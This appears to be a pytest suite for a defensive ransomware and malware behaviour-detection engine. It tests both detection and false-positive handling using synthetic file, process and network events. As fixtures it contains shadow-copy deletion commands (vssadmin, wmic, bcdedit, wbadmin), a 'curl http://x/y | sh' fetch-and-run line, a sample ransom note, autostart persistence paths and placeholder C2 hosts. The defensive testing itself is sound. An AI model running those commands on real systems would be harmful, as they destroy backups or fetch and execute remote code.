"""Behaviour engine: does it catch ransomware, and does it leave the compiler alone?

Every test here drives the engine with synthetic :class:`BehaviorEvent`s and
explicit timestamps.  Nothing sleeps, nothing touches the clock, so the window
and cooldown logic is exercised deterministically.
"""

from __future__ import annotations

import pytest

from aegis.models import (
    SCORE_BEHAVIOR_STRONG,
    SCORE_BEHAVIOR_WEAK,
    SCORE_INTEL_NETWORK,
    BehaviorEvent,
    BehaviorKind,
    DetectionLayer,
    Indicator,
    IndicatorKind,
    Severity,
)
from aegis.events import EventType
from aegis.realtime.behavior import (
    BEHAVIOR_RULES,
    BehaviorEngine,
    parse_severity,
    severity_at_least,
)

# Rule ids, spelled out so a rename cannot silently pass the suite.
MASS_MODIFY = "mass_file_modify"
ENCRYPT = "encrypt_in_place"
RENAME_EXT = "mass_rename_extension"
NOTE = "ransom_note"
AUTOSTART = "autostart_write"
PROPAGATION = "self_propagation"
MASS_DELETE = "mass_delete"
SHADOW = "shadow_copy_tamper"
BLOCKLIST = "blocklisted_connection"
BEACON = "beacon_pattern"
SPAWN = "script_spawn_chain"
TEMP = "exec_from_temp"

RANSOM_TEXT = (
    "ATTENTION! All your files have been encrypted with a strong cipher. "
    "To get the private key you must pay 0.5 bitcoin. Do not rename the files."
)


# --------------------------------------------------------------------------
# Helpers
# --------------------------------------------------------------------------
class FakeSignatureDB:
    """Just enough of ``aegis.core.signatures.SignatureDB`` for the intel rule."""

    def __init__(self, *indicators: Indicator) -> None:
        self.indicators = list(indicators)
        self.calls: list[dict] = []
        self.raise_on_lookup = False

    def lookup_network(self, *, host=None, url=None, ip=None):
        self.calls.append({"host": host, "url": url, "ip": ip})
        if self.raise_on_lookup:
            raise RuntimeError("baza wskaźników niedostępna")
        needle = (host or ip or url or "").lower()
        for indicator in self.indicators:
            if indicator.value == needle:
                return indicator
        return None


def rules_fired(engine: BehaviorEngine, pid: int | None) -> set[str]:
    verdict = engine.verdict_for(pid)
    return {d.rule for d in verdict.detections} if verdict else set()


def ransomware_burst(
    engine: BehaviorEngine,
    *,
    pid: int = 4242,
    process: str = "locker.bin",
    start: float = 1_000.0,
    files: int = 40,
    note_dirs: tuple[str, ...] = ("/home/u/docs", "/home/u/Desktop", "/home/u/Pictures"),
) -> float:
    """Create victim files, rewrite them with ciphertext, rename, drop notes."""
    t = start
    for i in range(files):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE,
                timestamp=t,
                path=f"/home/u/docs/f{i}.docx",
                pid=pid,
                process=process,
                size=20_000,
                entropy=4.1,
            )
        )
        t += 0.01
    for i in range(files):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_MODIFY,
                timestamp=t,
                path=f"/home/u/docs/f{i}.docx",
                pid=pid,
                process=process,
                size=20_480,
                entropy=7.95,
            )
        )
        t += 0.01
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_RENAME,
                timestamp=t,
                old_path=f"/home/u/docs/f{i}.docx",
                path=f"/home/u/docs/f{i}.docx.locked",
                pid=pid,
                process=process,
                size=20_480,
                entropy=7.95,
            )
        )
        t += 0.01
    for directory in note_dirs:
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE,
                timestamp=t,
                path=f"{directory}/HOW_TO_DECRYPT.txt",
                pid=pid,
                process=process,
                size=len(RANSOM_TEXT),
                entropy=4.4,
                extra={"sample_text": RANSOM_TEXT},
            )
        )
        t += 0.01
    return t


# --------------------------------------------------------------------------
# Catalogue / contract
# --------------------------------------------------------------------------
def test_rule_catalogue_is_well_formed(config):
    engine = BehaviorEngine(config)
    catalogue = engine.rules()
    assert len(catalogue) == len(BEHAVIOR_RULES) == 12
    ids = [rule["id"] for rule in catalogue]
    assert len(set(ids)) == len(ids)
    expected = {
        MASS_MODIFY, ENCRYPT, RENAME_EXT, NOTE, AUTOSTART, PROPAGATION,
        MASS_DELETE, SHADOW, BLOCKLIST, BEACON, SPAWN, TEMP,
    }
    assert set(ids) == expected
    for rule in catalogue:
        assert set(rule) >= {"id", "name", "description", "score"}
        assert rule["name"].strip() and rule["description"].strip()
        if rule["id"] == BLOCKLIST:
            assert rule["score"] == SCORE_INTEL_NETWORK
        else:
            assert SCORE_BEHAVIOR_WEAK <= rule["score"] <= SCORE_BEHAVIOR_STRONG
    # Polish user-facing text, with Polish characters.
    assert any(ch in "ąćęłńóśźż" for rule in catalogue for ch in rule["description"])


def test_rules_returns_a_copy(config):
    engine = BehaviorEngine(config)
    catalogue = engine.rules()
    catalogue[0]["name"] = "zepsute"
    catalogue.clear()
    assert BEHAVIOR_RULES[0]["name"] != "zepsute"
    assert len(engine.rules()) == 12


def test_severity_helpers():
    assert parse_severity("medium") is Severity.MEDIUM
    assert parse_severity("nonsense", Severity.HIGH) is Severity.HIGH
    assert parse_severity(Severity.LOW) is Severity.LOW
    assert severity_at_least(Severity.CRITICAL, Severity.HIGH)
    assert not severity_at_least(Severity.LOW, Severity.HIGH)


# --------------------------------------------------------------------------
# The headline case
# --------------------------------------------------------------------------
def test_ransomware_burst_reaches_high(config, bus):
    engine = BehaviorEngine(config, bus)
    ransomware_burst(engine)

    verdict = engine.verdict_for(4242)
    assert verdict is not None
    fired = {d.rule for d in verdict.detections}
    assert {MASS_MODIFY, ENCRYPT, RENAME_EXT, NOTE} <= fired
    assert verdict.severity in (Severity.HIGH, Severity.CRITICAL)
    assert verdict.score >= 70.0
    assert verdict.threat_name.startswith("Behav.")
    assert all(d.layer is DetectionLayer.BEHAVIOR for d in verdict.detections)
    assert all(d.pid == 4242 for d in verdict.detections)
    # verdicts() surfaces it, sorted worst first.
    listed = engine.verdicts(min_severity=Severity.HIGH)
    assert [v.pid for v in listed] == [4242]
    # Alerts reached the bus.
    alerts = bus.history(types={EventType.BEHAVIOR_ALERT})
    assert alerts and any(a.payload.get("rule") == ENCRYPT for a in alerts)
    assert all(a.level == "warning" for a in alerts)


def test_ransomware_with_blocklisted_c2_reaches_critical(config, bus):
    """Cross-layer corroboration: behaviour + intel must beat behaviour alone."""
    indicator = Indicator(
        kind=IndicatorKind.IPV4,
        value="203.0.113.77",
        name="Sim.Ransom.C2",
        source="feodo_ipblocklist",
    )
    db = FakeSignatureDB(indicator)
    engine = BehaviorEngine(config, bus, db)
    t = ransomware_burst(engine)
    engine.observe(
        BehaviorEvent(
            kind=BehaviorKind.NET_CONNECT,
            timestamp=t,
            pid=4242,
            process="locker.bin",
            remote_host="203.0.113.77",
            remote_port=443,
        )
    )

    verdict = engine.verdict_for(4242)
    assert verdict is not None
    layers = {d.layer for d in verdict.detections}
    assert layers == {DetectionLayer.BEHAVIOR, DetectionLayer.INTEL}
    assert verdict.severity is Severity.CRITICAL
    assert verdict.score == 100.0

    intel = [d for d in verdict.detections if d.layer is DetectionLayer.INTEL]
    assert len(intel) == 1
    assert intel[0].rule == BLOCKLIST
    assert intel[0].score == SCORE_INTEL_NETWORK
    assert intel[0].indicator is indicator
    assert intel[0].threat_name == "Sim.Ransom.C2"
    # An IP was looked up as an IP, not as a hostname.
    assert db.calls[0]["ip"] == "203.0.113.77"


# --------------------------------------------------------------------------
# False positives - the part that decides whether anyone keeps the product on
# --------------------------------------------------------------------------
def test_benign_bulk_write_burst_stays_below_action_threshold(config, bus):
    """A compiler writing 300 object files must not reach the response threshold."""
    engine = BehaviorEngine(config, bus)
    t = 2_000.0
    for i in range(300):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE,
                timestamp=t,
                path=f"/src/build/obj{i}.o",
                pid=7,
                process="gcc",
                cmdline="gcc -c src/obj.c -o build/obj.o",
                size=1_500,
                entropy=5.9,
            )
        )
        t += 0.002

    verdict = engine.verdict_for(7)
    assert verdict is not None
    assert verdict.detections == []           # the allowlist suppressed the bulk rule
    assert verdict.severity is Severity.CLEAN
    assert engine.verdicts(min_severity=Severity.LOW) == []
    assert not bus.history(types={EventType.BEHAVIOR_ALERT})


def test_unknown_process_bulk_burst_is_suspicious_but_not_actionable(config):
    """No allowlist hit, but no corroboration either: MEDIUM at most, never HIGH."""
    engine = BehaviorEngine(config)
    t = 3_000.0
    for i in range(200):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE,
                timestamp=t,
                path=f"/data/out/chunk{i}.dat",
                pid=99,
                process="some-unknown-tool",
                size=4_096,
                entropy=5.2,
            )
        )
        t += 0.002

    verdict = engine.verdict_for(99)
    assert {d.rule for d in verdict.detections} == {MASS_MODIFY}
    assert verdict.detections[0].confidence < 0.6     # low confidence on its own
    assert not severity_at_least(verdict.severity, Severity.HIGH)
    assert verdict.score < 70.0


def test_unzipping_high_entropy_files_is_not_encryption(config):
    """Freshly created .zip/.jpg files are high entropy by nature."""
    engine = BehaviorEngine(config)
    t = 4_000.0
    for i in range(30):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE,
                timestamp=t,
                path=f"/home/u/Downloads/pack{i}.zip",
                pid=11,
                process="archiver",
                size=10_000,
                entropy=7.99,
            )
        )
        t += 0.01
    assert ENCRYPT not in rules_fired(engine, 11)


def test_encrypt_in_place_requires_a_stable_size(config):
    """A rewrite that changes the size tenfold is a replacement, not encryption."""
    engine = BehaviorEngine(config)
    t = 5_000.0
    for i in range(10):
        path = f"/home/u/docs/report{i}.txt"
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE, timestamp=t, path=path, pid=12,
                process="writer", size=1_000, entropy=4.0,
            )
        )
        t += 0.01
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_MODIFY, timestamp=t, path=path, pid=12,
                process="writer", size=500_000, entropy=7.9,
            )
        )
        t += 0.01
    assert ENCRYPT not in rules_fired(engine, 12)


def test_compressed_extension_still_fires_when_entropy_jumped(config):
    """A .jpg that *was* measured at low entropy and is now ciphertext counts."""
    engine = BehaviorEngine(config)
    t = 5_500.0
    for i in range(5):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_MODIFY,
                timestamp=t,
                path=f"/home/u/Pictures/img{i}.jpg",
                pid=13,
                process="locker",
                size=100_000,
                entropy=7.95,
                extra={"prev_size": 99_000, "prev_entropy": 5.5},
            )
        )
        t += 0.01
    assert ENCRYPT in rules_fired(engine, 13)


def test_mass_rename_to_a_common_extension_is_ignored(config):
    """An editor save storm converging on .docx is not a ransom extension."""
    engine = BehaviorEngine(config)
    t = 6_000.0
    for i in range(20):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_RENAME, timestamp=t,
                old_path=f"/home/u/docs/tmp{i}.tmp", path=f"/home/u/docs/doc{i}.docx",
                pid=14, process="writer-app", size=2_000,
            )
        )
        t += 0.01
    assert RENAME_EXT not in rules_fired(engine, 14)


def test_readme_markdown_is_never_a_ransom_note(config):
    """``git clone`` creates README.md in dozens of directories."""
    engine = BehaviorEngine(config)
    t = 7_000.0
    for i in range(12):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE, timestamp=t,
                path=f"/src/project/pkg{i}/README.md", pid=15, process="unknown-vcs",
                size=400, entropy=4.3,
            )
        )
        t += 0.01
    assert NOTE not in rules_fired(engine, 15)


def test_plain_readme_txt_in_two_directories_is_not_enough(config):
    engine = BehaviorEngine(config)
    t = 7_500.0
    for directory in ("/src/a", "/src/b"):
        engine.observe(
            BehaviorEvent(
                kind=BehaviorKind.FILE_CREATE, timestamp=t,
                path=f"{directory}/README.txt", pid=16, process="unknown-tool",
                size=400, entropy=4.3,
            )
        )
        t += 0.01
    assert NOTE not in rules_fired(engine, 16)


# --------------------------------------------------------------------------
# Individual rules
# --------------------------------------------------------------------------
def test_ransom_note_language_fires_on_a_single_file(config):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(
            kind=BehaviorKind.FILE_CREATE,
            timestamp=8_000.0,
            path="/home/u/docs/notatka.txt",
            pid=17,
            process="dropper",
            size=200,
            extra={"sample_text": RANSOM_TEXT},
        )
    )
    assert [d.rule for d in fired] == [NOTE]
    assert fired[0].confidence == 1.0
    assert fired[0].score == SCORE_BEHAVIOR_STRONG


def test_ransom_note_strong_name_shapes_need_two_directories(config):
    engine = BehaviorEngine(config)
    t = 8_100.0
    engine.observe(
        BehaviorEvent(kind=BehaviorKind.FILE_CREATE, timestamp=t,
                      path="/home/u/a/HOW_TO_RESTORE.txt", pid=18, process="x")
    )
    assert NOTE not in rules_fired(engine, 18)
    engine.observe(
        BehaviorEvent(kind=BehaviorKind.FILE_CREATE, timestamp=t + 0.1,
                      path="/home/u/b/!!!DECRYPT_INSTRUCTIONS!!!.html", pid=18, process="x")
    )
    assert NOTE in rules_fired(engine, 18)


@pytest.mark.parametrize(
    "cmdline",
    [
        "vssadmin.exe Delete Shadows /All /Quiet",
        'cmd /c "wmic shadowcopy delete"',
        "bcdedit /set {default} recoveryenabled No",
        "wbadmin delete catalog -quiet",
        "vssadmin resize shadowstorage /for=c: /maxsize=1",
    ],
)
def test_shadow_copy_tamper_variants(config, cmdline):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(
            kind=BehaviorKind.PROCESS_START, timestamp=9_000.0, pid=20,
            process="cmd.exe", cmdline=cmdline,
        )
    )
    assert SHADOW in {d.rule for d in fired}
    detection = next(d for d in fired if d.rule == SHADOW)
    assert detection.score == SCORE_BEHAVIOR_STRONG
    assert detection.confidence == 1.0
    assert detection.layer is DetectionLayer.BEHAVIOR


def test_ordinary_command_line_does_not_fire_shadow_rule(config):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(
            kind=BehaviorKind.PROCESS_START, timestamp=9_100.0, pid=21,
            process="bash", cmdline="rm -rf build && make -j8",
        )
    )
    assert SHADOW not in {d.rule for d in fired}


def test_blocklisted_connection_without_db_is_silent(config):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.NET_CONNECT, timestamp=9_200.0, pid=22,
                      remote_host="203.0.113.77", remote_port=443)
    )
    assert fired == []


def test_blocklisted_connection_matches_domains_by_host(config):
    db = FakeSignatureDB(
        Indicator(kind=IndicatorKind.DOMAIN, value="evil.example", name="URLhaus.Evil")
    )
    engine = BehaviorEngine(config, None, db)
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.NET_CONNECT, timestamp=9_300.0, pid=23,
                      remote_host="evil.example", remote_port=80)
    )
    assert [d.rule for d in fired] == [BLOCKLIST]
    assert fired[0].layer is DetectionLayer.INTEL
    assert db.calls[0]["host"] == "evil.example"


def test_failing_intel_lookup_does_not_break_monitoring(config):
    db = FakeSignatureDB()
    db.raise_on_lookup = True
    engine = BehaviorEngine(config, None, db)
    assert engine.observe(
        BehaviorEvent(kind=BehaviorKind.NET_CONNECT, timestamp=9_400.0, pid=24,
                      remote_host="1.2.3.4", remote_port=53)
    ) == []


def test_beacon_pattern_needs_regular_intervals(config):
    engine = BehaviorEngine(config)
    t = 10_000.0
    fired: list = []
    for _ in range(6):
        fired += engine.observe(
            BehaviorEvent(kind=BehaviorKind.NET_CONNECT, timestamp=t, pid=25,
                          process="implant", remote_host="c2.example", remote_port=8443)
        )
        t += 5.0
    rules = {d.rule for d in fired}
    assert BEACON in rules
    detection = next(d for d in fired if d.rule == BEACON)
    assert "c2.example" in detection.detail


def test_jittered_connections_are_not_a_beacon(config):
    engine = BehaviorEngine(config)
    t = 11_000.0
    fired: list = []
    for gap in (1.2, 9.0, 2.4, 17.0, 3.1, 11.0):
        fired += engine.observe(
            BehaviorEvent(kind=BehaviorKind.NET_CONNECT, timestamp=t, pid=26,
                          process="browser", remote_host="cdn.example", remote_port=443)
        )
        t += gap
    assert BEACON not in {d.rule for d in fired}


def test_connection_burst_is_not_a_beacon(config):
    engine = BehaviorEngine(config)
    t = 11_500.0
    fired: list = []
    for _ in range(10):
        fired += engine.observe(
            BehaviorEvent(kind=BehaviorKind.NET_CONNECT, timestamp=t, pid=27,
                          process="updater", remote_host="mirror.example", remote_port=443)
        )
        t += 0.05
    assert BEACON not in {d.rule for d in fired}


def test_script_spawn_chain(config):
    engine = BehaviorEngine(config)
    engine.observe(
        BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=12_000.0, pid=500,
                      ppid=499, process="soffice.bin", path="/usr/lib/soffice.bin")
    )
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=12_001.0, pid=501,
                      ppid=500, process="bash", path="/bin/bash",
                      cmdline="bash -c curl http://x/y | sh")
    )
    assert SPAWN in {d.rule for d in fired}


def test_shell_spawned_by_an_ordinary_parent_is_not_a_chain(config):
    engine = BehaviorEngine(config)
    engine.observe(
        BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=12_100.0, pid=600,
                      ppid=599, process="make")
    )
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=12_101.0, pid=601,
                      ppid=600, process="sh")
    )
    assert SPAWN not in {d.rule for d in fired}


def test_exec_from_temp_is_weak_on_its_own(config):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=13_000.0, pid=700,
                      process="payload", path="/tmp/payload.bin")
    )
    assert [d.rule for d in fired] == [TEMP]
    verdict = engine.verdict_for(700)
    # Below THRESHOLD_LOW: a single weak signal must not raise an alarm.
    assert verdict.severity is Severity.CLEAN
    assert verdict.score < 15.0


def test_exec_from_our_own_data_dir_is_ignored(config):
    engine = BehaviorEngine(config)
    internal = str(config.quarantine_dir / "payload.bin")
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=13_100.0, pid=701,
                      process="payload", path=internal)
    )
    assert fired == []


@pytest.mark.parametrize(
    "path",
    [
        "/home/u/.config/autostart/evil.desktop",
        "/home/u/.config/systemd/user/evil.service",
        "/etc/cron.d/evil",
        "C:\\Users\\u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk",
    ],
)
def test_autostart_write_by_path_shape(config, path):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.FILE_CREATE, timestamp=14_000.0, pid=800,
                      process="dropper", path=path, size=200, entropy=4.0)
    )
    assert AUTOSTART in {d.rule for d in fired}


def test_autostart_write_event_kind(config):
    engine = BehaviorEngine(config)
    fired = engine.observe(
        BehaviorEvent(kind=BehaviorKind.AUTOSTART_WRITE, timestamp=14_100.0, pid=801,
                      process="dropper", path="/opt/whatever/run-me")
    )
    assert AUTOSTART in {d.rule for d in fired}


def test_self_propagation_across_directories(config):
    engine = BehaviorEngine(config)
    t = 15_000.0
    fired: list = []
    for directory in ("/home/u", "/home/u/docs", "/media/usb"):
        fired += engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_CREATE, timestamp=t,
                          path=f"{directory}/update.exe", pid=900, process="worm",
                          size=50_000, entropy=6.5,
                          extra={"content_hash": "a" * 64})
        )
        t += 0.1
    assert PROPAGATION in {d.rule for d in fired}


def test_mass_delete(config):
    engine = BehaviorEngine(config)
    t = 16_000.0
    for i in range(40):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_DELETE, timestamp=t,
                          path=f"/home/u/docs/old{i}.txt", pid=1000, process="wiper")
        )
        t += 0.01
    assert MASS_DELETE in rules_fired(engine, 1000)


def test_mass_delete_is_allowlisted_for_build_tools(config):
    engine = BehaviorEngine(config)
    t = 16_500.0
    for i in range(40):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_DELETE, timestamp=t,
                          path=f"/src/build/obj{i}.o", pid=1001, process="make",
                          cmdline="make clean")
        )
        t += 0.01
    assert MASS_DELETE not in rules_fired(engine, 1001)


# --------------------------------------------------------------------------
# State management: windows, cooldowns, memory bounds
# --------------------------------------------------------------------------
def test_cooldown_keeps_one_rampage_from_emitting_hundreds_of_detections(config, bus):
    engine = BehaviorEngine(config, bus)
    t = 17_000.0
    total = 0
    for i in range(600):
        total += len(
            engine.observe(
                BehaviorEvent(kind=BehaviorKind.FILE_MODIFY, timestamp=t,
                              path=f"/home/u/docs/f{i % 50}.dat", pid=1100,
                              process="rampage", size=4_096, entropy=5.0)
            )
        )
        t += 0.01
    assert 0 < total <= 6, f"cooldown nie zadziałał: {total} wykryć"
    verdict = engine.verdict_for(1100)
    assert len(verdict.detections) <= 6


def test_events_outside_the_window_do_not_accumulate(config):
    engine = BehaviorEngine(config)
    t = 18_000.0
    for i in range(20):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_CREATE, timestamp=t,
                          path=f"/data/{i}.bin", pid=1200, process="slow-writer", size=10)
        )
        t += 0.01
    # Jump far beyond config.behavior_window_sec and write another 20 files.
    t += config.behavior_window_sec * 5
    for i in range(20, 40):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_CREATE, timestamp=t,
                          path=f"/data/{i}.bin", pid=1200, process="slow-writer", size=10)
        )
        t += 0.01
    assert MASS_MODIFY not in rules_fired(engine, 1200)
    state = engine._actors[1200]            # noqa: SLF001 - memory bound is the point
    assert len(state.writes) == 20


def test_actor_table_is_bounded(config):
    engine = BehaviorEngine(config)
    for pid in range(3_000):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.PROCESS_START, timestamp=19_000.0 + pid,
                          pid=pid, process=f"proc{pid}")
        )
    assert len(engine._actors) <= 512       # noqa: SLF001
    assert engine.stats()["observed"] == 3_000


def test_unattributed_events_land_in_the_none_bucket(config):
    engine = BehaviorEngine(config)
    t = 20_000.0
    for i in range(40):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_MODIFY, timestamp=t,
                          path=f"/home/u/docs/f{i}.dat", size=4_096, entropy=5.0)
        )
        t += 0.01
    assert engine.verdict_for(None) is not None
    assert MASS_MODIFY in rules_fired(engine, None)
    assert engine.verdict_for(12345) is None
    assert [v.pid for v in engine.verdicts()] == [None]


def test_reset_clears_everything(config):
    engine = BehaviorEngine(config)
    ransomware_burst(engine)
    assert engine.verdicts()
    engine.reset()
    assert engine.verdicts() == []
    assert engine.verdict_for(4242) is None
    assert engine.stats()["actors"] == 0


def test_disabled_engine_observes_nothing(config):
    config.behavior_enabled = False
    engine = BehaviorEngine(config)
    assert engine.observe(
        BehaviorEvent(kind=BehaviorKind.FILE_MODIFY, path="/x", entropy=8.0, size=10)
    ) == []
    assert engine.verdicts() == []


def test_touched_paths_are_recorded_and_bounded(config):
    engine = BehaviorEngine(config)
    t = 21_000.0
    for i in range(500):
        engine.observe(
            BehaviorEvent(kind=BehaviorKind.FILE_MODIFY, timestamp=t,
                          path=f"/home/u/docs/f{i}.dat", pid=1300, process="x",
                          size=1_000, entropy=5.0)
        )
        t += 0.01
    verdict = engine.verdict_for(1300)
    assert 0 < len(verdict.touched_paths) <= 256
    assert verdict.event_count == 500


def test_garbage_input_is_survivable(config):
    engine = BehaviorEngine(config)
    assert engine.observe("nie jestem zdarzeniem") == []    # type: ignore[arg-type]
    assert engine.observe(None) == []                        # type: ignore[arg-type]
